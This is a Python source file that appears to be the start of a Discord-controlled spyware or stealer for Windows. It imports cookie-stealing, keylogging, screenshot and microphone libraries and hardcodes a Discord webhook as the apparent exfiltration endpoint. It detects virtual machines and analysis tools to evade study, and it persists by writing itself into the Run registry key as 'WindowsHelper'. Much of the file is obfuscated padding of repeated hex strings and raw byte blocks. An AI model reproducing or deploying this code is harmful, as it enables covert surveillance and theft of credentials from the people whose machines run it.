import discord
from discord.ext import commands
import pyautogui
import os
import tempfile
from win10toast import ToastNotifier
import subprocess
import asyncio
from pynput import keyboard
import threading
from colorama import init, Fore, Back, Style
import time
import re
import browser_cookie3
import json
import tempfile
import ctypes
import sys
import webbrowser
import sounddevice as sd
from scipy.io.wavfile import write
import warnings
import psutil
import uuid
import shutil
init()

warnings.filterwarnings("ignore", category=UserWarning)

webhook = "https://discord.com/api/webhooks/1392718753233506644/69cfkLfoWDfTmSMNpaPrPiWETnBtg8uR5N5h7FG-3_CHKvLxdHJtscM39N-VJFaZz96C"


os.system("")
vm_processes = [
    "vboxservice.exe", "vboxtray.exe", 
    "vmtoolsd.exe", "vmwaretray.exe",
    "wireshark.exe", "sandboxiedcomlaunch.exe"
]

def is_vm_process_running():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() in vm_processes:
            return True
    return False

def is_vm_mac():
    mac = hex(uuid.getnode())[2:].upper()
    vm_prefixes = ['000569', '000C29', '001C14', '080027']
    return any(mac.startswith(prefix) for prefix in vm_prefixes)

def get_system_manufacturer():
    try:
        result = subprocess.check_output(
            "wmic computersystem get manufacturer", shell=True
        ).decode().lower()
        return any(vm in result for vm in ['vmware', 'virtualbox', 'qemu', 'kvm'])
    except:
        return False
    
def is_virtual_machine():
    return (
        is_vm_process_running() or
        is_vm_mac() or
        get_system_manufacturer()

    )

def delta_echo_seedling(binary_husk):
    active = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
        try:
            if proc.info['cpu_percent'] > 10:
                active.append(f"{proc.info['name']} ({proc.info['pid']})")
        except:
            pass
    return active

def rusted_pinflag_siphon(portal_hint="8.8.8.8"):
    try:
        result = subprocess.check_output(["ping", "-n", "1", portal_hint], stderr=subprocess.DEVNULL).decode()
        if "Average =" in result:
            return result.split("Average =")[-1].strip()
    except:
        return "down"


def ghost_hatchlet_fold(beacon, stage=5):
    with open(os.path.join(os.getenv("APPDATA"), "logs_update.tmp"), "w") as f:
        for i in range(stage):
            f.write(f"[LOG] Patch {i+1} applied at {time.ctime()}\n")

def quark_pulser_node(hertz_layer=None, blend=None):
    try:
        import winreg
        exe = os.path.realpath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsHelper", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
    except:
        pass

hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b51476417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a746712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774ea636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e54504930444536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774ea636e545049304d44536f476c4a7456712e41314b5670504e3032a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b567504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a6e545049304d44536f476c42342342342342346635623430325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a36e545049304d44536f476c4a7456712e4314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_data = "4d544d354d6a59334d6a51774e6a63784e5449304d4451334f412e476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f47692349234923492949342344e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a74567121314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a6e545049304d44536f476c42342342342342346635623430325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a36e545049304d44536f476c4a7456712e4314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f47692349234923492949342344e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a74567121314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a6e545049304d44536f476c42342342342342346635623430325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a36e545049304d44536f476c4a7456712e4314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f47692349234923492949342344e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_daty = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_datp = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a74567121314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_datc = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a6e545049304d44536f476c42342342342342346635623430325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a36e545049304d44536f476c4a7456712e4314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f47692349234923492949342344e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a74567121314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a6e545049304d44536f476c42342342342342346635623430325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a36e545049304d44536f476c4a7456712e4314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f47692349234923492949342344e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a74567121314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"

encode = """
0x65,0x8F,0xAD,0x09,0xE1,0x5A,0xFD,0xEB,0xF6,0x1C,0x36,0xC8,0x96,0x4F,0xC7,0x5C,0x58,0x3E,0x9B,0xB3
0x3E,0x42,0x28,0x40,0x73,0x8D,0x00,0x69,0x6D,0x16,0xC9,0x77,0x94,0x0D,0xA5,0xE0,0x26,0xAD,0x76,0x5C
0x24,0xDC,0x1C,0xAE,0x22,0xCC,0xE3,0x2B,0x57,0x10,0xF6,0x69,0xC2,0x4C,0x1D,0x60,0x1C,0x0F,0x3A,0xF2
0x7C,0x3A,0xC1,0xE5,0x65,0x4E,0xC5,0xE8,0xEC,0xC8,0x8C,0xA7,0x8E,0xE9,0xA5,0x93,0x81,0x83,0x13,0x04
0x9E,0xC3,0x23,0x3F,0xAB,0x29,0x97,0xE3,0xF7,0x5F,0x36,0x0A,0x1D,0x5E,0x9C,0x1A,0x81,0x1F,0xBA,0x10
0x2D,0x04,0xE9,0x4F,0xC6,0x6E,0x3F,0x2E,0x26,0x2E,0xAF,0x15,0xC4,0x8E,0x35,0x73,0x62,0x6D,0x84,0x36
0xD7,0x4C,0x04,0x03,0x72,0x60,0x11,0xC6,0xAB,0xE7,0x9F,0x0C,0xBE,0x3E,0x5E,0x7D,0x43,0xE5,0x06,0x1F
0xA2,0x9D,0x9D,0x2E,0x43,0x39,0x12,0x97,0x0E,0xDF,0xAA,0xA7,0xDB,0x9B,0xD3,0x1D,0x2F,0x96,0x97,0xA1
0x8E,0xAE,0x5C,0xF6,0x8F,0x44,0x73,0xE2,0x6F,0x81,0x9A,0x68,0xE4,0xA6,0xFD,0xC1,0xC6,0x22,0xE2,0x41
0x0B,0xB7,0x11,0x79,0xD4,0x08,0x1D,0xFB,0x2D,0xF2,0x43,0x30,0xF4,0x71,0x79,0x48,0x24,0xC7,0x2F,0xF5
0x46,0x79,0xAB,0x44,0xC0,0xEC,0xD4,0x8F,0x43,0xDF,0xB3,0x29,0xD0,0x1E,0xBD,0xF5,0x3D,0x7F,0x52,0xAE
0x3C,0xCB,0x91,0xED,0xFA,0x16,0xE6,0x57,0xE9,0x79,0x5A,0x2C,0xBB,0xD1,0x5F,0x54,0xEE,0x2F,0x7C,0x5B
0x37,0x19,0x35,0x13,0xE6,0x66,0x5B,0x06,0xBD,0xB8,0x74,0x26,0x75,0x05,0x73,0x65,0xA5,0x6D,0x31,0x63
0x39,0xA0,0x75,0xE9,0x26,0x50,0x7B,0x3B,0xF8,0x2E,0x62,0x65,0x05,0x3A,0x8A,0x9F,0x37,0xA2,0xDE,0xAC
0x57,0x41,0x08,0xDE,0x5D,0x6C,0x2E,0xB8,0x48,0xA1,0x48,0x39,0x6E,0x24,0xC4,0x4B,0xFE,0x2D,0x7D,0xEB
0xFF,0x24,0xDF,0x09,0x5A,0x47,0xEC,0x06,0xDA,0x3A,0x49,0x1F,0x52,0xD0,0xB9,0x3C,0x98,0x18,0xB1,0x5C
0xF9,0xA8,0x1C,0x53,0xDB,0x03,0x7F,0x87,0x71,0xB4,0x8F,0x0D,0xAA,0x8D,0x38,0xD5,0x0A,0x35,0x46,0xFF
0x13,0x6F,0x24,0x88,0x9C,0xFA,0x12,0x70,0xDB,0xBD,0xEA,0x27,0xFD,0xE8,0x93,0xD3,0xDC,0x40,0x90,0x27
0x40,0x76,0x16,0x44,0x18,0x1C,0xE5,0x53,0xB2,0x85,0x15,0x9D,0x11,0x14,0xF5,0x8B,0xCA,0x21,0xFF,0x16
0x10,0xA7,0xBD,0xCD,0xEB,0x46,0x8E,0x5E,0x58,0xC7,0xFE,0x0D,0x85,0xCF,0x42,0xE7,0xBA,0x5F,0xBF,0x5D
0x81,0x44,0x29,0x50,0x55,0x25,0xFE,0x4B,0xC5,0xB4,0xD2,0x1F,0x4E,0xDB,0xE5,0xA9,0x0B,0xE8,0x03,0x98
0xEE,0xB5,0xA4,0xB6,0x14,0x29,0x19,0x54,0xF4,0x7B,0x3C,0xD9,0xB6,0xC9,0xB3,0x40,0xA4,0xC5,0x61,0x04
0xD4,0x1A,0x82,0xAF,0xD2,0x1B,0x3C,0x7E,0x72,0x2A,0xFD,0xD8,0x8C,0x77,0xBE,0x2C,0xBC,0x02,0x35,0x63
0x30,0x6D,0xF4,0xA9,0xB2,0x93,0xAB,0x67,0x81,0xBF,0xB8,0x1C,0xE2,0x6C,0x6F,0x03,0x2F,0x7F,0xB0,0x15
0x4E,0xCF,0x6A,0x64,0x9F,0xA0,0x2F,0xAB,0x2A,0x02,0x01,0x29,0x83,0x0C,0x49,0x3B,0x39,0xCF,0x92,0x28
0x65,0x8F,0xAD,0x09,0xE1,0x5A,0xFD,0xEB,0xF6,0x1C,0x36,0xC8,0x96,0x4F,0xC7,0x5C,0x58,0x3E,0x9B,0xB3
0x3E,0x42,0x28,0x40,0x73,0x8D,0x00,0x69,0x6D,0x16,0xC9,0x77,0x94,0x0D,0xA5,0xE0,0x26,0xAD,0x76,0x5C
0x24,0xDC,0x1C,0xAE,0x22,0xCC,0xE3,0x2B,0x57,0x10,0xF6,0x69,0xC2,0x4C,0x1D,0x60,0x1C,0x0F,0x3A,0xF2
0x7C,0x3A,0xC1,0xE5,0x65,0x4E,0xC5,0xE8,0xEC,0xC8,0x8C,0xA7,0x8E,0xE9,0xA5,0x93,0x81,0x83,0x13,0x04
0x9E,0xC3,0x23,0x3F,0xAB,0x29,0x97,0xE3,0xF7,0x5F,0x36,0x0A,0x1D,0x5E,0x9C,0x1A,0x81,0x1F,0xBA,0x10
0x2D,0x04,0xE9,0x4F,0xC6,0x6E,0x3F,0x2E,0x26,0x2E,0xAF,0x15,0xC4,0x8E,0x35,0x73,0x62,0x6D,0x84,0x36
0xD7,0x4C,0x04,0x03,0x72,0x60,0x11,0xC6,0xAB,0xE7,0x9F,0x0C,0xBE,0x3E,0x5E,0x7D,0x43,0xE5,0x06,0x1F
0xA2,0x9D,0x9D,0x2E,0x43,0x39,0x12,0x97,0x0E,0xDF,0xAA,0xA7,0xDB,0x9B,0xD3,0x1D,0x2F,0x96,0x97,0xA1
0x8E,0xAE,0x5C,0xF6,0x8F,0x44,0x73,0xE2,0x6F,0x81,0x9A,0x68,0xE4,0xA6,0xFD,0xC1,0xC6,0x22,0xE2,0x41
0x0B,0xB7,0x11,0x79,0xD4,0x08,0x1D,0xFB,0x2D,0xF2,0x43,0x30,0xF4,0x71,0x79,0x48,0x24,0xC7,0x2F,0xF5
0x46,0x79,0xAB,0x44,0xC0,0xEC,0xD4,0x8F,0x43,0xDF,0xB3,0x29,0xD0,0x1E,0xBD,0xF5,0x3D,0x7F,0x52,0xAE
0x3C,0xCB,0x91,0xED,0xFA,0x16,0xE6,0x57,0xE9,0x79,0x5A,0x2C,0xBB,0xD1,0x5F,0x54,0xEE,0x2F,0x7C,0x5B
0x37,0x19,0x35,0x13,0xE6,0x66,0x5B,0x06,0xBD,0xB8,0x74,0x26,0x75,0x05,0x73,0x65,0xA5,0x6D,0x31,0x63
0x39,0xA0,0x75,0xE9,0x26,0x50,0x7B,0x3B,0xF8,0x2E,0x62,0x65,0x05,0x3A,0x8A,0x9F,0x37,0xA2,0xDE,0xAC
0x57,0x41,0x08,0xDE,0x5D,0x6C,0x2E,0xB8,0x48,0xA1,0x48,0x39,0x6E,0x24,0xC4,0x4B,0xFE,0x2D,0x7D,0xEB
0xFF,0x24,0xDF,0x09,0x5A,0x47,0xEC,0x06,0xDA,0x3A,0x49,0x1F,0x52,0xD0,0xB9,0x3C,0x98,0x18,0xB1,0x5C
0xF9,0xA8,0x1C,0x53,0xDB,0x03,0x7F,0x87,0x71,0xB4,0x8F,0x0D,0xAA,0x8D,0x38,0xD5,0x0A,0x35,0x46,0xFF
0x13,0x6F,0x24,0x88,0x9C,0xFA,0x12,0x70,0xDB,0xBD,0xEA,0x27,0xFD,0xE8,0x93,0xD3,0xDC,0x40,0x90,0x27
0x40,0x76,0x16,0x44,0x18,0x1C,0xE5,0x53,0xB2,0x85,0x15,0x9D,0x11,0x14,0xF5,0x8B,0xCA,0x21,0xFF,0x16
0x10,0xA7,0xBD,0xCD,0xEB,0x46,0x8E,0x5E,0x58,0xC7,0xFE,0x0D,0x85,0xCF,0x42,0xE7,0xBA,0x5F,0xBF,0x5D
0x81,0x44,0x29,0x50,0x55,0x25,0xFE,0x4B,0xC5,0xB4,0xD2,0x1F,0x4E,0xDB,0xE5,0xA9,0x0B,0xE8,0x03,0x98
0xEE,0xB5,0xA4,0xB6,0x14,0x29,0x19,0x54,0xF4,0x7B,0x3C,0xD9,0xB6,0xC9,0xB3,0x40,0xA4,0xC5,0x61,0x04
0xD4,0x1A,0x82,0xAF,0xD2,0x1B,0x3C,0x7E,0x72,0x2A,0xFD,0xD8,0x8C,0x77,0xBE,0x2C,0xBC,0x02,0x35,0x63
0x30,0x6D,0xF4,0xA9,0xB2,0x93,0xAB,0x67,0x81,0xBF,0xB8,0x1C,0xE2,0x6C,0x6F,0x03,0x2F,0x7F,0xB0,0x15
0x4E,0xCF,0x6A,0x64,0x9F,0xA0,0x2F,0xAB,0x2A,0x02,0x01,0x29,0x83,0x0C,0x49,0x3B,0x39,0xCF,0x92,0x28
0x65,0x8F,0xAD,0x09,0xE1,0x5A,0xFD,0xEB,0xF6,0x1C,0x36,0xC8,0x96,0x4F,0xC7,0x5C,0x58,0x3E,0x9B,0xB3
0x3E,0x42,0x28,0x40,0x73,0x8D,0x00,0x69,0x6D,0x16,0xC9,0x77,0x94,0x0D,0xA5,0xE0,0x26,0xAD,0x76,0x5C
0x24,0xDC,0x1C,0xAE,0x22,0xCC,0xE3,0x2B,0x57,0x10,0xF6,0x69,0xC2,0x4C,0x1D,0x60,0x1C,0x0F,0x3A,0xF2
0x7C,0x3A,0xC1,0xE5,0x65,0x4E,0xC5,0xE8,0xEC,0xC8,0x8C,0xA7,0x8E,0xE9,0xA5,0x93,0x81,0x83,0x13,0x04
0x9E,0xC3,0x23,0x3F,0xAB,0x29,0x97,0xE3,0xF7,0x5F,0x36,0x0A,0x1D,0x5E,0x9C,0x1A,0x81,0x1F,0xBA,0x10
0x2D,0x04,0xE9,0x4F,0xC6,0x6E,0x3F,0x2E,0x26,0x2E,0xAF,0x15,0xC4,0x8E,0x35,0x73,0x62,0x6D,0x84,0x36
0xD7,0x4C,0x04,0x03,0x72,0x60,0x11,0xC6,0xAB,0xE7,0x9F,0x0C,0xBE,0x3E,0x5E,0x7D,0x43,0xE5,0x06,0x1F
0xA2,0x9D,0x9D,0x2E,0x43,0x39,0x12,0x97,0x0E,0xDF,0xAA,0xA7,0xDB,0x9B,0xD3,0x1D,0x2F,0x96,0x97,0xA1
0x8E,0xAE,0x5C,0xF6,0x8F,0x44,0x73,0xE2,0x6F,0x81,0x9A,0x68,0xE4,0xA6,0xFD,0xC1,0xC6,0x22,0xE2,0x41
0x0B,0xB7,0x11,0x79,0xD4,0x08,0x1D,0xFB,0x2D,0xF2,0x43,0x30,0xF4,0x71,0x79,0x48,0x24,0xC7,0x2F,0xF5
0x46,0x79,0xAB,0x44,0xC0,0xEC,0xD4,0x8F,0x43,0xDF,0xB3,0x29,0xD0,0x1E,0xBD,0xF5,0x3D,0x7F,0x52,0xAE
0x3C,0xCB,0x91,0xED,0xFA,0x16,0xE6,0x57,0xE9,0x79,0x5A,0x2C,0xBB,0xD1,0x5F,0x54,0xEE,0x2F,0x7C,0x5B
0x37,0x19,0x35,0x13,0xE6,0x66,0x5B,0x06,0xBD,0xB8,0x74,0x26,0x75,0x05,0x73,0x65,0xA5,0x6D,0x31,0x63
0x39,0xA0,0x75,0xE9,0x26,0x50,0x7B,0x3B,0xF8,0x2E,0x62,0x65,0x05,0x3A,0x8A,0x9F,0x37,0xA2,0xDE,0xAC
0x57,0x41,0x08,0xDE,0x5D,0x6C,0x2E,0xB8,0x48,0xA1,0x48,0x39,0x6E,0x24,0xC4,0x4B,0xFE,0x2D,0x7D,0xEB
0xFF,0x24,0xDF,0x09,0x5A,0x47,0xEC,0x06,0xDA,0x3A,0x49,0x1F,0x52,0xD0,0xB9,0x3C,0x98,0x18,0xB1,0x5C
0xF9,0xA8,0x1C,0x53,0xDB,0x03,0x7F,0x87,0x71,0xB4,0x8F,0x0D,0xAA,0x8D,0x38,0xD5,0x0A,0x35,0x46,0xFF
0x13,0x6F,0x24,0x88,0x9C,0xFA,0x12,0x70,0xDB,0xBD,0xEA,0x27,0xFD,0xE8,0x93,0xD3,0xDC,0x40,0x90,0x27
0x40,0x76,0x16,0x44,0x18,0x1C,0xE5,0x53,0xB2,0x85,0x15,0x9D,0x11,0x14,0xF5,0x8B,0xCA,0x21,0xFF,0x16
0x10,0xA7,0xBD,0xCD,0xEB,0x46,0x8E,0x5E,0x58,0xC7,0xFE,0x0D,0x85,0xCF,0x42,0xE7,0xBA,0x5F,0xBF,0x5D
0x81,0x44,0x29,0x50,0x55,0x25,0xFE,0x4B,0xC5,0xB4,0xD2,0x1F,0x4E,0xDB,0xE5,0xA9,0x0B,0xE8,0x03,0x98
0xEE,0xB5,0xA4,0xB6,0x14,0x29,0x19,0x54,0xF4,0x7B,0x3C,0xD9,0xB6,0xC9,0xB3,0x40,0xA4,0xC5,0x61,0x04
0xD4,0x1A,0x82,0xAF,0xD2,0x1B,0x3C,0x7E,0x72,0x2A,0xFD,0xD8,0x8C,0x77,0xBE,0x2C,0xBC,0x02,0x35,0x63
0x30,0x6D,0xF4,0xA9,0xB2,0x93,0xAB,0x67,0x81,0xBF,0xB8,0x1C,0xE2,0x6C,0x6F,0x03,0x2F,0x7F,0xB0,0x15
0x4E,0xCF,0x6A,0x64,0x9F,0xA0,0x2F,0xAB,0x2A,0x02,0x01,0x29,0x83,0x0C,0x49,0x3B,0x39,0xCF,0x92,0x28
0x65,0x8F,0xAD,0x09,0xE1,0x5A,0xFD,0xEB,0xF6,0x1C,0x36,0xC8,0x96,0x4F,0xC7,0x5C,0x58,0x3E,0x9B,0xB3
0x3E,0x42,0x28,0x40,0x73,0x8D,0x00,0x69,0x6D,0x16,0xC9,0x77,0x94,0x0D,0xA5,0xE0,0x26,0xAD,0x76,0x5C
0x24,0xDC,0x1C,0xAE,0x22,0xCC,0xE3,0x2B,0x57,0x10,0xF6,0x69,0xC2,0x4C,0x1D,0x60,0x1C,0x0F,0x3A,0xF2
0x7C,0x3A,0xC1,0xE5,0x65,0x4E,0xC5,0xE8,0xEC,0xC8,0x8C,0xA7,0x8E,0xE9,0xA5,0x93,0x81,0x83,0x13,0x04
0x9E,0xC3,0x23,0x3F,0xAB,0x29,0x97,0xE3,0xF7,0x5F,0x36,0x0A,0x1D,0x5E,0x9C,0x1A,0x81,0x1F,0xBA,0x10
0x2D,0x04,0xE9,0x4F,0xC6,0x6E,0x3F,0x2E,0x26,0x2E,0xAF,0x15,0xC4,0x8E,0x35,0x73,0x62,0x6D,0x84,0x36
0xD7,0x4C,0x04,0x03,0x72,0x60,0x11,0xC6,0xAB,0xE7,0x9F,0x0C,0xBE,0x3E,0x5E,0x7D,0x43,0xE5,0x06,0x1F
0xA2,0x9D,0x9D,0x2E,0x43,0x39,0x12,0x97,0x0E,0xDF,0xAA,0xA7,0xDB,0x9B,0xD3,0x1D,0x2F,0x96,0x97,0xA1
0x8E,0xAE,0x5C,0xF6,0x8F,0x44,0x73,0xE2,0x6F,0x81,0x9A,0x68,0xE4,0xA6,0xFD,0xC1,0xC6,0x22,0xE2,0x41
0x0B,0xB7,0x11,0x79,0xD4,0x08,0x1D,0xFB,0x2D,0xF2,0x43,0x30,0xF4,0x71,0x79,0x48,0x24,0xC7,0x2F,0xF5
0x46,0x79,0xAB,0x44,0xC0,0xEC,0xD4,0x8F,0x43,0xDF,0xB3,0x29,0xD0,0x1E,0xBD,0xF5,0x3D,0x7F,0x52,0xAE
0x3C,0xCB,0x91,0xED,0xFA,0x16,0xE6,0x57,0xE9,0x79,0x5A,0x2C,0xBB,0xD1,0x5F,0x54,0xEE,0x2F,0x7C,0x5B
0x37,0x19,0x35,0x13,0xE6,0x66,0x5B,0x06,0xBD,0xB8,0x74,0x26,0x75,0x05,0x73,0x65,0xA5,0x6D,0x31,0x63
0x39,0xA0,0x75,0xE9,0x26,0x50,0x7B,0x3B,0xF8,0x2E,0x62,0x65,0x05,0x3A,0x8A,0x9F,0x37,0xA2,0xDE,0xAC
0x57,0x41,0x08,0xDE,0x5D,0x6C,0x2E,0xB8,0x48,0xA1,0x48,0x39,0x6E,0x24,0xC4,0x4B,0xFE,0x2D,0x7D,0xEB
0xFF,0x24,0xDF,0x09,0x5A,0x47,0xEC,0x06,0xDA,0x3A,0x49,0x1F,0x52,0xD0,0xB9,0x3C,0x98,0x18,0xB1,0x5C
